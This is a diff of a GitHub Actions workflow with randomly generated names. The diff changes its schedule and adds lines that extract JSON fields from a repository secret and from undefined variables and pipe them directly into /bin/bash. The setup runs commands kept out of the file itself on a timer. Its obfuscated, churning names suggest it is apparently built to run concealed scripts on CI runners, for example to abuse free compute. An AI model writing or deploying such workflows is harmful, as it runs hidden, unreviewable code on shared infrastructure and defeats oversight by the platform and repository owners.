@@ -2,20 +2,25 @@ name: outlyingdull
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '53 1/6 * * *'
 
-jobs:  # 21237
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: outlyingdull
         env:
-          qyduh63: ${{ secrets.qyduh63 }}
+          wp07438: ${{ secrets.wp07438 }}
         run: |
-          echo $qyduh63 | jq -r .vb222 | /bin/bash
-          echo $yjc34 | jq -r .ilxix9 | /bin/bash
-          echo $ceywg5 | jq -r .yfibq97564 | /bin/bash
-          echo $ci676 | jq -r .qab7 | /bin/bash
+          echo $wp07438 | jq -r .yfqu1523 | /bin/bash
+          echo $hdrqm0 | jq -r .vq331 | /bin/bash
+          echo $dg29300 | jq -r .omfe2 | /bin/bash
+          echo $haz281 | jq -r .jb03 | /bin/bash
+          echo $iqncg4073 | jq -r .x38109 | /bin/bash
+          echo $taz84 | jq -r .rzrkx286 | /bin/bash
+          echo $my0779 | jq -r .dem73 | /bin/bash
+          echo $hfj0 | jq -r .bknet0 | /bin/bash
+          echo $g98551 | jq -r .xn67879 | /bin/bash
+          echo $bt9 | jq -r .bafk591 | /bin/bash
 
